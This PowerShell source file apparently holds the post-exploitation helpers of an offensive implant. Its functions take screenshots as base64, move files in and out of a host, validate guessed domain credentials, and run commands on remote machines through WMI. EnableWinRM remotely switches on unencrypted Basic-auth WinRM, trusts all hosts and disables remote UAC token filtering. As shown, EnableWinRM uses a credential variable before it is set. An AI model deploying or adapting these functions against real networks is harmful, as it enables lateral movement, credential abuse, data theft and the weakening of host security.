Function Web-Upload-File 
{
    Param
    (
        [string]
        $From,
        [string]
        $To
    )
    (Get-Webclient).DownloadFile($From,$To)
}
function Unzip($file, $destination)
{
	$shell = new-object -com shell.application
	$zip = $shell.NameSpace($file)
	foreach($item in $zip.items())
	{
		$shell.Namespace($destination).copyhere($item)
	}
}
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath
 
    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize
     
    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);
     
    $reader.Dispose()
    $writer.Dispose()
}
Function Test-ADCredential
{
	Param($username, $password, $domain)
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
	$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
	$object = New-Object PSObject | Select Username, Password, IsValid
	$object.Username = $username;
	$object.Password = $password;
	$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
	return $object
}
Function Get-Screenshot 
{
#import libraries
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

# Gather Screen resolution information
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Create bitmap using the top-left and bottom-right bounds
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height

# Create Graphics object
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

# Capture screen
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

# Send back as base64
$msimage = New-Object IO.MemoryStream
$bitmap.save($msimage, "png")
$b64 = [Convert]::ToBase64String($msimage.toarray())
return $b64
}
function Download-File
{
    param
    (
        [string] $Source
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $base64
    $reader.Dispose()
}
function Upload-File 
{
    param
    (
        [string] $Base64,
        [string] $Destination
    )
    write-output "Uploaded file to: $Destination"
    $fileBytes = [Convert]::FromBase64String($Base64)
    [io.file]::WriteAllBytes($Destination, $fileBytes)
                
}
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}
function EnableWinRM {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer
)
Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-ItemProperty –Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System –Name  LocalAccountTokenFilterPolicy –Value 1 –Type DWord}
Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
$command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
}

function DisableWinRM {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer
)
$command = "cmd /c powershell.exe -c Set-Item WSMan:\localhost\Service\Auth\Basic -Value $False;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $False;winrm delete winrm/config/listener?address=*+transport=HTTP;Stop-Service -force winrm;Set-Service -Name winrm -StartupType Disabled"
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
}
function WMICommand {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer,
[string]
$command
)
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
}

Function Get-ProcessFull {

[System.Diagnostics.Process[]] $processes64bit = @()
[System.Diagnostics.Process[]] $processes32bit = @()

$AllProcesses = @()

foreach($process in get-process) {
    $modules = $process.modules
    foreach($module in $modules) {
        $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
        if($file -eq "wow64.dll") {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.starttime
            $pobject.Name = $process.Name
            $pobject.Arch = "x86"
            $AllProcesses += $pobject
            break
        }
    }

    if(!($processes32bit -contains $process)) {
        $processes64bit += $process
        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
        $pobject.Id = $process.Id
        $pobject.StartTime = $process.starttime
        $pobject.Name = $process.Name
        $pobject.Arch = "x64"
        $AllProcesses += $pobject
    }
}

$AllProcesses|Select ID, Arch, Name, StartTime | format-table -wrap

}